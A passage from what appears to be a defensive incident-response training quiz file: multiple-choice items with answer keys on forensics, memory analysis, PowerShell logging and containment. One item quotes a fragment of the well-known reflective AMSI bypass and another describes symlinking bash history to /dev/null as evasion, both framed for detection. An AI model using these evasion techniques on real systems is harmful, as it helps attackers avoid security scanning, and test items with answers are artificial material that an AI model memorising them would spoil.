          "`ss -tunap`, `crontab -l` for all users, `systemctl list-timers`, and review of `/etc/rc.local` and shell rc files",
          "`ls -l` in the home directory only",
          "`ping 8.8.8.8` and `top`",
          "`cat /etc/passwd` alone"
        ],
        correctAnswer: 0,
        explanation: "Socket-to-process mapping plus cron, systemd timers and rc/profile files covers the standard Linux persistence and C2 surface."
      },
      {
        id: "sap-q4-7",
        difficulty: "medium",
        tags: ["Linux", "Anti-Forensics"],
        scenario: "A user's `.bash_history` is a symlink to `/dev/null` and `HISTFILE` is unset in their profile.",
        question: "What should you conclude?",
        options: [
          "The user prefers a clean home directory",
          "Deliberate anti-forensic history suppression — pivot to auditd/execve logs and EDR telemetry",
          "The shell is misconfigured by default",
          "The file system is corrupted"
        ],
        correctAnswer: 1,
        explanation: "Nulled history is an intentional evasion. Investigation must move to sources the user cannot trivially edit: auditd, EDR, and centralised logs."
      },
      {
        id: "sap-q4-8",
        difficulty: "hard",
        tags: ["Memory", "Volatility"],
        scenario: "You have a memory image from an infected host and suspect an unlinked (hidden) process.",
        question: "Which Volatility approach is correct?",
        options: [
          "`pslist` only, because it is the fastest",
          "Compare `pslist` with `psscan` — pool scanning reveals processes unlinked from the active process list",
          "`filescan` for every file on disk",
          "`hashdump` to list credentials"
        ],
        correctAnswer: 1,
        explanation: "`pslist` walks the doubly-linked list an attacker can unlink; `psscan` finds EPROCESS structures directly, so differences expose DKOM-hidden processes."
      },
      {
        id: "sap-q4-9",
        difficulty: "medium",
        tags: ["Memory", "Order of Volatility"],
        scenario: "A live host is confirmed compromised and needs both memory and disk evidence.",
        question: "What is the correct collection order?",
        options: [
          "Shut down the host, then image the disk, then collect memory",
          "Capture volatile memory and network state first, then acquire the disk image",
          "Run antivirus first to clean the machine",
          "Delete suspicious files before imaging"
        ],
        correctAnswer: 1,
        explanation: "RFC 3227 order of volatility: RAM, network connections, running processes, then persistent storage. Shutdown destroys memory evidence irrecoverably."
      },
      {
        id: "sap-q4-10",
        difficulty: "medium",
        tags: ["Browser Forensics"],
        scenario: "You need to confirm whether a user actually clicked a phishing link and downloaded a file on Chrome.",
        question: "Which artefacts should you examine?",
        options: [
          "The Chrome `History` SQLite database (urls, visits) and the `downloads` table, plus cache entries",
          "The Windows Event Log only",
          "The DNS cache alone",
          "The Recycle Bin"
        ],
        correctAnswer: 0,
        explanation: "Chrome's History database records visits with timestamps and transition types, and the downloads table records target paths, referrers and sizes — direct evidence of user action."
      },
      {
        id: "sap-q4-11",
        difficulty: "medium",
        tags: ["PowerShell", "Logging"],
        scenario: "Attackers used heavily obfuscated PowerShell. Only Event ID 400 (engine start) is available.",
        question: "Which logging should be enabled to capture the deobfuscated code?",
        options: [
          "Script Block Logging (Event ID 4104), plus module logging and transcription",
          "Only PowerShell command history",
          "Firewall logging",
          "DNS debug logging"
        ],
        correctAnswer: 0,
        explanation: "Script Block Logging records blocks as executed — after deobfuscation — making 4104 the primary source for obfuscated PowerShell analysis."
      },
      {
        id: "sap-q4-12",
        difficulty: "hard",
        tags: ["AMSI", "Evasion"],
        scenario: "4104 logs show `[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')` with a field set to `$true`.",
        question: "What is the attacker doing?",
        options: [
          "Enabling verbose logging",
          "Patching/bypassing AMSI so subsequent malicious script content is not scanned",
          "Installing a PowerShell module",
          "Checking the PowerShell version"
        ],
        correctAnswer: 1,
        explanation: "String-concatenated reflection into AmsiUtils to flip `amsiInitFailed` is the classic AMSI bypass; the attempt itself is a high-fidelity detection opportunity."
      },
      {
        id: "sap-q4-13",
        difficulty: "medium",
        tags: ["Windows Events"],
        scenario: "Event ID 7045 records a new service named `mssecsvc2.0` with an ImagePath pointing to `%TEMP%\\a.exe`, installed at 03:12 by a non-admin-hours account.",
        question: "Why is this high priority?",
        options: [
          "New services installed from TEMP outside change windows are a common persistence and lateral-movement artefact",
          "Event 7045 is informational and always benign",
          "Services always run from TEMP",
          "It indicates a printer driver update"
        ],
        correctAnswer: 0,
        explanation: "Service creation (T1543.003) from a user-writable path at odd hours is a strong persistence/lateral-movement signal, notably associated with PsExec-style tooling."
      },
      {
        id: "sap-q4-14",
        difficulty: "medium",
        tags: ["Triage Decision"],
        scenario: "EDR flags a process as suspicious. The hash is unknown to VirusTotal, the binary is unsigned, and it was written to disk 4 minutes before execution by a browser process.",
        question: "What is the correct verdict path?",
        options: [
          "Close as benign because VirusTotal has no detections",
          "Treat as suspicious: recent browser-written unsigned binary warrants containment and deeper analysis regardless of AV verdicts",
          "Wait 30 days and re-check VirusTotal",
          "Ask the user whether they trust the file"
        ],
        correctAnswer: 1,
        explanation: "Absence of AV detection is not evidence of safety — novel payloads are unknown by design. Provenance and behaviour drive the verdict."
      },
      {
        id: "sap-q4-15",
        difficulty: "medium",
        tags: ["Containment"],
        scenario: "You isolate an infected laptop via EDR network containment but leave the EDR management channel open.",
        question: "Why keep that channel?",
        options: [
          "To let the malware update",
          "To retain remote investigation and remediation capability while blocking attacker communication",
          "It has no security relevance",
          "To keep the user productive"
        ],
        correctAnswer: 1,
        explanation: "Network containment blocks adversary traffic while preserving the agent's management tunnel so responders can collect artefacts and remediate remotely."
      }
    ]
  }
];
